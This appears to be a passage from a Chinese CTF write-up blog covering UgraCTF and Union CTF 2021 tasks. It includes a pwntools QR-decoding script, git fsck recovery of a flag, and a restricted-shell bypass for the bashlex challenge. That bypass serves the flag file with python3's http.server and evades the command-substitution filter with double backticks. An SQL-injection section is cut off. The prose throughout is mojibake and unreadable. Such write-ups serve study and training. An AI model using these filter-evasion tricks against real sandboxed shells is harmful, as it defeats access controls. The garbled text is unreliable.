ÃŸÃ›ÃŸÃŸÃ›ÃœÃŸÃœÃœÃ›ÃœÃ›Ã›Ã› ÃœÃŸÃ›Ã›ÃŸ ÃŸÃ›Ã› Ã›ÃœÃŸÃ›ÃŸÃ›Ã› Ã›Ã›  ÃŸÃ›ÃŸÃœÃ› ÃœÃŸÃœÃŸÃœÃœÃœÃœÃŸÃŸÃœÃ›ÃŸÃŸÃŸÃ›Ã›ÃŸ   ÃœÃ› ÃŸÃ›Ã›ÃŸÃ›ÃŸÃœ ÃœÃœÃŸÃ›ÃŸÃ›ÃŸÃŸÃŸÃœÃœÃŸÃ›ÃœÃŸ ÃœÃœÃ›  Ã› ÃŸÃ›ÃŸÃœÃ›Ã›ÃœÃœÃŸ Ãœ Ã›ÃŸÃ› ÃœÃŸÃœÃŸÃœÃ›Ã›ÃœÃœÃœÃœÃœÃœ Ã›Ã›ÃŸÃœÃ›  ÃŸÃ›ÃŸ ÃŸÃ›Ã›ÃœÃŸÃŸÃŸÃ›Ã›Ã›Ãœ Ã›Ã›Ã› Ã›ÃŸÃ› ÃŸÃ›  ÃœÃ›   ÃŸ ÃœÃ›Ã›ÃŸ Ãœ ÃœÃ›ÃŸÃŸ ÃŸÃŸÃœÃœ ÃœÃ›  Ã› ÃŸ  Ãœ ÃŸÃ› ÃŸ  Ãœ ÃŸÃ› Ã›Ã›  Ãœ  ÃŸÃœ  ÃŸÃŸÃœÃ›ÃœÃŸÃœÃœÃŸÃœÃœÃœÃœÃœÃœÃŸÃŸ ÃŸÃŸ  Ã›ÃœÃœÃŸÃœ  Ã›Ã›ÃœÃœ ÃŸÃ›ÃœÃ›ÃœÃŸÃ›Ã›ÃŸÃœ ÃŸÃœÃœÃ›Ã› Ã›  ÃœÃœÃ›Ã›ÃŸ Ãœ ÃŸÃ›ÃŸÃŸ ÃœÃŸ ÃŸ ÃœÃ›Ã›ÃœÃœÃœÃœÃ›Ã›ÃŸÃ›ÃŸÃœ   ÃŸ Ãœ ÃŸÃ›ÃœÃ›ÃŸÃŸÃ›ÃŸ     ÃœÃ›ÃœÃŸÃŸ ÃŸÃœÃœÃ›Ã› ÃœÃ›ÃŸÃŸÃœÃŸÃœÃŸÃœÃ›ÃŸÃŸÃœ   Ã›ÃŸ ÃœÃŸÃŸÃ›Ã›ÃŸÃ›  ÃœÃ›ÃŸÃŸÃŸ Ã›Ã›Ãœ Ã› ÃœÃ›ÃŸ     ÃŸ Ã›ÃŸÃŸÃœ ÃŸ ÃœÃ› ÃœÃ›ÃŸÃ›Ãœ Ãœ  ÃœÃ›ÃŸÃŸÃœÃ›ÃŸÃŸÃŸÃ›ÃœÃ› ÃŸÃ›ÃŸÃŸÃŸÃŸÃŸÃ› ÃœÃŸÃ›ÃŸÃ›ÃœÃœÃœÃŸÃŸÃ›ÃœÃŸÃœÃœÃ› ÃŸÃœÃŸ  ÃŸÃœÃ› ÃŸ Ã›Ã› Ãœ Ã› Ã›Ã›Ã› Ã›  Ãœ ÃœÃŸÃœÃŸ ÃœÃ›Ã›ÃŸ  Ã›Ãœ Ãœ ÃœÃœÃŸÃŸÃŸÃŸÃ›ÃŸÃŸÃŸ  ÃœÃ›Ã› ÃŸÃŸÃŸ Ã›  ÃœÃ›ÃŸÃ›ÃŸÃŸÃ› ÃŸÃ›Ã›  ÃŸÃ›Ã›ÃœÃœÃŸÃ› ÃœÃŸÃŸÃ›Ã›ÃŸÃŸ Ã›ÃŸÃœÃŸÃŸÃŸÃŸÃŸÃŸÃŸ  ÃŸÃŸÃŸÃŸ     ÃŸÃŸÃŸÃŸ ÃŸ ÃŸÃŸÃŸÃŸ  ÃŸ  ÃŸ ÃŸÃŸÃŸ  </span><br></pre></td></tr></table></figure><p>æ€»å…±æœ‰ 861 ä¸ªå­—ç¬¦ï¼Œå¾ˆå®¹æ˜“æ±‚å¾—å…¶ä¸¤ä¸ªçœŸçº¦æ•°ä¸º 21ã€41ã€‚çŒœæµ‹å…¶æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œä¿®æ”¹è„šæœ¬å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">connection = remote(<span class="string">&quot;soviet.q.2021.ugractf.ru&quot;</span>, <span class="number">17792</span>)</span><br><span class="line">connection.recvline()</span><br><span class="line">connection.sendline(<span class="string">&quot;9bd0f869bb947165bd66ba2e7f5a5aeb&quot;</span>)</span><br><span class="line">content = connection.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Recieved &#123;&#125;&quot;</span>.<span class="built_in">format</span>(content))</span><br><span class="line">content = content.replace(<span class="string">b&quot;\xdb&quot;</span>, <span class="string">b&quot;\xe2\x96\x88&quot;</span>) <span class="comment"># â–ˆ</span></span><br><span class="line">content = content.replace(<span class="string">b&quot;\xdf&quot;</span>, <span class="string">b&quot;\xe2\x96\x80&quot;</span>) <span class="comment"># â–€</span></span><br><span class="line">content = content.replace(<span class="string">b&quot;\xdc&quot;</span>, <span class="string">b&quot;\xe2\x96\x84&quot;</span>) <span class="comment"># â–„</span></span><br><span class="line">content = content.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Content parsed as &#123;&#125;&quot;</span>.<span class="built_in">format</span>(content))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">    <span class="built_in">print</span>(content[x * <span class="number">41</span> : (x + <span class="number">1</span>) * <span class="number">41</span>])</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â–ˆâ–€â–€â–€â–€â–€â–ˆ â–€ â–ˆâ–€  â–„â–„â–€ â–„â–„â–€â–ˆâ–„â–€â–ˆ â–ˆ â–„â–€â–„ â–ˆ â–ˆâ–€â–€â–€â–€â–€â–ˆ</span><br><span class="line">â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ â–€â–€â–ˆâ–„â–€â–€â–€â–„ â–€ â–ˆâ–„ â–€â–ˆâ–„â–€    â–„â–€  â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ</span><br><span class="line">â–ˆ â–€â–€â–€ â–ˆ â–€  â–€â–€â–„â–€ â–„â–€â–„â–ˆâ–€â–ˆâ–€ â–„â–€ â–€â–ˆâ–€â–„â–€â–ˆ â–ˆ â–€â–€â–€ â–ˆ</span><br><span class="line">â–€â–€â–€â–€â–€â–€â–€ â–ˆ â–ˆâ–„â–ˆ â–€â–„â–ˆâ–„â–€â–„â–ˆâ–„â–ˆ â–€â–„â–€ â–ˆ â–€ â–ˆ â–€â–€â–€â–€â–€â–€â–€</span><br><span class="line">  â–„ â–„â–ˆâ–€â–„â–„â–ˆâ–€ â–€â–€â–ˆ â–€â–€ â–€â–ˆâ–€â–€â–„â–€â–„â–ˆâ–ˆ â–€â–„â–„  â–€â–„â–ˆâ–„â–ˆ â–€</span><br><span class="line">â–„â–„ â–€â–„â–€â–€â–ˆâ–€â–„â–ˆâ–ˆâ–ˆâ–€â–„â–€â–€â–ˆâ–„â–ˆâ–„â–„â–ˆâ–€â–ˆâ–ˆ â–€â–„â–€â–€â–„â–„â–€ â–„ â–ˆ  â–„</span><br><span class="line"> â–ˆâ–„ â–€ â–€â–€â–ˆ â–„â–„â–€â–ˆâ–€â–„â–ˆ â–„â–€â–ˆâ–„â–€â–„â–ˆâ–€â–„â–€ â–€ â–€â–ˆâ–€â–€â–ˆâ–„â–€â–„â–„â–ˆ</span><br><span class="line">â–„â–ˆâ–ˆâ–ˆ â–„â–€â–ˆâ–€â–€ â–€â–ˆâ–ˆ â–ˆâ–„â–€â–ˆâ–€â–ˆâ–€â–€â–ˆâ–€  â–€â–ˆâ–€â–„â–ˆ â–„â–€â–„â–€â–„â–„â–„â–„</span><br><span class="line">â–€â–€â–„â–ˆâ–€â–€â–€â–ˆâ–ˆâ–€   â–„â–ˆ â–€â–ˆâ–ˆâ–€ â–€â–„ â–„â–„â–€â–ˆâ–€â–ˆâ–€â–ˆâ–€â–„â–„â–ˆâ–ˆâ–„â–€ â–„</span><br><span class="line">â–„â–ˆâ–€ â–ˆ â–€â–ˆâ–€ â–ˆâ–ˆâ–„â–„â–€ â–„ â–ˆâ–€â–ˆ â–„â–ˆâ–„ â–„â–ˆâ–ˆâ–„â–„â–ˆâ–„â–„â–„ â–ˆâ–ˆâ–ˆâ–„â–ˆ</span><br><span class="line">  â–€â–€â–€ â–€â–€â–ˆâ–„â–€â–€â–€â–ˆâ–ˆâ–ˆâ–„ â–ˆâ–ˆâ–ˆ â–ˆâ–„â–ˆ â–€â–ˆ  â–„â–ˆ  â–„â–€â–„â–„â–ˆâ–€ </span><br><span class="line"> â–„ â–„â–ˆâ–€  â–€â–€â–„â–„ â–„â–ˆ  â–ˆ â–€â–€ â–„ â–€â–ˆ â–ˆ    â–€â–ˆ â–ˆâ–„  â–„ </span><br><span class="line"> â–€â–„  â–€â–€â–„â–ˆâ–„ â–„â–„â–€â–„â–„â–„â–„â–„â–„â–€â–€ â–€â–ˆ  â–ˆâ–„â–„ â–„â–„ â–ˆâ–ˆâ–„â–„ â–€â–ˆ</span><br><span class="line">â–„â–ˆâ–„â–€â–ˆâ–ˆâ–€â–„ â–€â–„â–„â–ˆâ–ˆ â–ˆ  â–„â–„â–ˆâ–€â–€ â–€ â–€â–ˆâ–€â–€ â–„â–€ â–€ â–„â–ˆâ–ˆâ–„â–„</span><br><span class="line">â–„â–ˆâ–ˆâ–ˆâ–€â–€â–€â–„   â–€â–€â–„â–„â–ˆâ–ˆâ–„â–ˆâ–ˆâ–€â–ˆâ–€ â–„   â–„â–ˆâ–„â–€â–€ â–€â–„â–„â–ˆâ–ˆ â–„</span><br><span class="line">â–ˆâ–€â–€â–„â–€â–„â–€â–„â–ˆâ–€â–€â–„   â–ˆâ–€ â–„â–€â–€â–ˆâ–ˆâ–€â–ˆ  â–„â–ˆâ–€â–€â–€ â–ˆâ–ˆâ–„ â–ˆ â–„â–ˆ</span><br><span class="line">â–€     â–€ â–ˆâ–€â–€â–„ â–€ â–„â–ˆ â–„â–ˆ â–ˆâ–„ â–ˆ  â–„â–ˆâ–€â–€â–„â–ˆâ–€â–€â–€â–ˆâ–„â–ˆ â–€</span><br><span class="line">â–ˆâ–€â–€â–€â–€â–€â–ˆ â–„â–€â–ˆâ–€â–ˆâ–„â–„â–„â–€â–€â–ˆâ–„â–€â–„â–„â–ˆ â–€â–„â–€  â–€â–„â–ˆ â–€ â–ˆâ–ˆ â–„ </span><br><span class="line">â–ˆ â–ˆâ–ˆâ–ˆ â–ˆ  â–„ â–„â–€â–„â–€ â–„â–ˆâ–ˆâ–€  â–ˆâ–„ â–„ â–„â–„â–€â–€â–€â–€â–ˆâ–€â–€â–€  â–„â–ˆ</span><br><span class="line">â–ˆ â–€â–€â–€ â–ˆ  â–„â–ˆâ–€â–ˆâ–€â–€â–ˆâ–€â–€â–ˆâ–ˆ â–„â–€â–ˆâ–ˆâ–„â–„â–€â–ˆ â–„â–€â–€â–ˆâ–ˆâ–€â–€ â–ˆâ–€â–„</span><br><span class="line">â–€â–€â–€â–€â–€â–€â–€  â–€â–€â–€â–€     â–€â–€â–€â–€ â–€ â–€â–€â–€â–€  â–€  â–€ â–€â–€â–€  </span><br></pre></td></tr></table></figure><p>Word ç¨å¾®æ’ä¸€ä¸‹ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/639ec06e-c421-456e-b634-e2e7145e132b/1614774910974/3cd9144c9e0716b0caa2a5e319b3ad9191a9c9ec.png@256w.png"></p><p><code>Parse QR Code</code> å³å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_soviet_technologies_are_eternal_369863efd250</span><br></pre></td></tr></table></figure><h3 id="ĞĞ¾Ğ²ĞµĞ¹ÑˆĞ°Ñ-Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚ĞºĞ°-developers"><a href="#ĞĞ¾Ğ²ĞµĞ¹ÑˆĞ°Ñ-Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚ĞºĞ°-developers" class="headerlink" title="ĞĞ¾Ğ²ĞµĞ¹ÑˆĞ°Ñ Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚ĞºĞ° developers"></a>ĞĞ¾Ğ²ĞµĞ¹ÑˆĞ°Ñ Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚ĞºĞ° developers</h3><blockquote><p>Ğ­Ñ‚Ğ¾ Ğ¸ÑÑ…Ğ¾Ğ´Ğ½Ñ‹Ğ¹ ĞºĞ¾Ğ´ Ğ¿Ñ€Ğ¾Ğ³Ñ€Ğ°Ğ¼Ğ¼Ğ½Ğ¾Ğ³Ğ¾ Ğ¾Ğ±ĞµÑĞ¿ĞµÑ‡ĞµĞ½Ğ¸Ñ, Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ°Ğ½Ğ½Ğ¾Ğ³Ğ¾ Ğ¾Ñ‡ĞµĞ½ÑŒ ĞºÑ€ÑƒÑ‚Ñ‹Ğ¼Ğ¸ Ñ€Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚Ñ‡Ğ¸ĞºĞ°Ğ¼Ğ¸. ĞĞ¾ Ğ¸Ğ½Ğ¾Ğ³Ğ´Ğ° Ğ¸ Ğ¾Ğ½Ğ¸ Ğ´Ğ¾Ğ¿ÑƒÑĞºĞ°ÑÑ‚ Ğ¾ÑˆĞ¸Ğ±ĞºĞ¸. ĞÑƒ Ñ‚Ğ°Ğº, Ğ¿Ğ¾ Ğ½ĞµĞ²Ğ½Ğ¸Ğ¼Ğ°Ñ‚ĞµĞ»ÑŒĞ½Ğ¾ÑÑ‚Ğ¸.</p><p>è¿™æ˜¯éå¸¸å‡ºè‰²çš„å¼€å‘äººå‘˜å¼€å‘çš„è½¯ä»¶çš„æºä»£ç ã€‚ ä½†æ˜¯æœ‰æ—¶å€™ä»–ä»¬ä¹Ÿä¼šçŠ¯é”™è¯¯ã€‚ å¥½å§ï¼Œæ— æ„é—´ã€‚</p></blockquote><blockquote><p>è€ƒç‚¹ï¼š <a href="https://git-scm.com/docs/git-fsck">https://git-scm.com/docs/git-fsck</a></p></blockquote><p>ä½¿ç”¨ git fsck å¯ä»¥ dangling å‡ºä¸€ä¸ª commitã€‚æ­¤æ—¶æŸ¥çœ‹ç›¸å…³ commit å¯å¾—åˆ° flagã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">commit 7f3b10fd4fdf9a74cab201e4f3f8ece5cf9e4833</span><br><span class="line">Author: Validian &lt;validian@validian.name&gt;</span><br><span class="line">Date:   Wed Dec 11 06:00:30 2019 +0845</span><br><span class="line"></span><br><span class="line">    added info.txt.</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/info.txt b/info.txt</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000..d3849f0</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/info.txt</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,7 @@</span></span><br><span class="line"><span class="addition">+If you are reading this, I am definitely dead by now.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+I also know that by reaching this file, you have demonstrated</span></span><br><span class="line"><span class="addition">+the best of your ability and courage. Here is the key to my</span></span><br><span class="line"><span class="addition">+lifetime secret: ugra_the_yellow_purse_6f557934d3d1f541</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+You will understand what to do next. Good luck!</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_the_yellow_purse_6f557934d3d1f541</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Union CTF 2021</title>
      <link href="/zh-CN/posts/17a1c7f0.html"/>
      <url>/zh-CN/posts/17a1c7f0.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ğŸ‘‘-Welcome-ğŸ‘‘"><a href="#ğŸ‘‘-Welcome-ğŸ‘‘" class="headerlink" title="ğŸ‘‘ Welcome ğŸ‘‘"></a>ğŸ‘‘ Welcome ğŸ‘‘</h3><p>Rules é‡Œé¢å¯ä»¥æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;r0p_s4v3_the_que3n&#125;</span><br></pre></td></tr></table></figure><h3 id="bashlex"><a href="#bashlex" class="headerlink" title="bashlex"></a>bashlex</h3><blockquote><p>We made a new restricted shell with fancy AST validation, and we donâ€™t allow <code>cat</code>!</p><p>The flag is in <code>/home/bashlex/flag.txt</code>.</p></blockquote><p>ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bashlex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ALLOWED_COMMANDS = [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">ast</span>):</span></span><br><span class="line">    queue = [ast]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        node = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> node.kind == <span class="string">&#x27;command&#x27;</span>:</span><br><span class="line">            first_child = node.parts[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> first_child.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> first_child.parts:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Forbidden top level command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.startswith((<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Path components are forbidden&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.isalpha() <span class="keyword">and</span> \</span><br><span class="line">                        first_child.word <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_COMMANDS:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Forbidden command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;commandsubstitution&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Command substitution is forbidden&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;[&#x27;</span>] <span class="keyword">if</span> c <span class="keyword">in</span> node.word]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Wildcards are forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> node.word:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag is forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Add node children</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;parts&#x27;</span>):</span><br><span class="line">            queue += node.parts</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;list&#x27;</span>):</span><br><span class="line">            <span class="comment"># CompoundNode</span></span><br><span class="line">            queue += node.<span class="built_in">list</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    inp = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parts = bashlex.parse(inp)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> parts:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> validate(p):</span><br><span class="line">                valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;INVALID&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    subprocess.call([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, inp])</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹ä¸€ä¸‹ bashlex çš„æŠ½å–é€»è¾‘ï¼Œä»¥ ls è¿™æ¡æŒ‡ä»¤ä¸ºä¾‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CommandNode(parts&#x3D;[WordNode(parts&#x3D;[] pos&#x3D;(0, 2) word&#x3D;&#39;ls&#39;)] pos&#x3D;(0, 2))]</span><br></pre></td></tr></table></figure><p>CommandNode é‡ŒåŒ…æ‹¬ WordNodeï¼Œæ¯ä¸ª Node åŒ…æ‹¬ pos å’Œ partsã€‚æ‰€ä»¥æ­¤æ—¶çš„è§„åˆ™å¤§æ¦‚æ˜¯æŒ‡ä»¤ä¸­ä¸èƒ½å«æœ‰å˜é‡ã€ä¸èƒ½ä»¥è·¯å¾„å¼€å¤´ã€å¦‚æœæ˜¯çº¯å­—æ¯çš„æŒ‡ä»¤åˆ™ä¸å…è®¸ç™½åå•ä»¥å¤–çš„æŒ‡ä»¤ã€‚åŒæ—¶ä¸å¯ä»¥ä½¿ç”¨ bash çš„æŒ‡ä»¤æ›¿ä»£ï¼ˆä½†æ˜¯è¿™ç‚¹æœ‰ç‚¹è¿·æƒ‘ï¼‰ã€‚æ‰€ä»¥åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªéçº¯å­—æ¯ç»„æˆçš„æŒ‡ä»¤å³å¯ã€‚è¿™é‡Œå› ä¸ºæ˜¯ python çš„ç¯å¢ƒã€‚äºæ˜¯æœ‰ python3 çš„æŒ‡ä»¤å¯ä»¥è¢«æˆåŠŸæ‰§è¡Œã€‚ç”±äºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å°è¯•å¼€ä¸ª http æœåŠ¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è®¿é—®åˆ°<a href="http://34.90.44.21:2333/home/bashlex/flag.txt">è¿™é‡Œ</a>å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;chomsky_go_lllllllll1&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å¤§ä½¬çš„ä¸€ç§è§£æ³•æ˜¯ç”¨çš„æŒ‡ä»¤æ›¿ä»£ï¼Œä½†æ˜¯è¦ä½¿ç”¨åŒæ•°åå¼•å·å»æ›¿ä»£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;`ls`</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[CommandsubstitutionNode(<span class="built_in">command</span>=CommandNode(parts=[WordNode(parts=[] pos=(1, 3) word=<span class="string">&#x27;ls&#x27;</span>)] pos=(1, 3)) pos=(0, 4))] pos=(0, 4) word=<span class="string">&#x27;`ls`&#x27;</span>)] pos=(0, 4))] <span class="comment">#æ­¤æ—¶å› ä¸ºè¢« bashlex æ­£ç¡®è§£ææ— æ³•é€šè¿‡æ£€æµ‹</span></span><br><span class="line">&gt;``ls``</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[] pos=(0, 6) word=<span class="string">&#x27;``ls``&#x27;</span>)] pos=(0, 6))] <span class="comment">#æ­¤æ—¶è§£æå‡ºæ¥åªæœ‰ä¸€ä¸ª WordNodeï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Meet-the-Union-Committee"><a href="#Meet-the-Union-Committee" class="headerlink" title="Meet the Union Committee"></a>Meet the Union Committee</h3><blockquote><p>A committee was formed last year to decide the highly-sensitive contents of our challenges. All we could find is their profiles on this website. They are super paranoid that their profile site is hackable and decided to implement insane rate limits. Really we need to get access to the adminâ€™s password. If only that was possible.</p></blockquote><p>éšä¾¿ç‚¹è¿›ä¸€ä¸ªäººçš„ä¸»é¡µå¯ä»¥å‘ç° URL å¤šäº†ä¸ª GET å‚æ•° idã€‚å°è¯•ä¸‹å‘ç°å­˜åœ¨ SQL æ³¨å…¥ï¼Œä¸”å¯ä»¥å‘ç°å¦‚ä¸‹æŠ¥é”™ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call 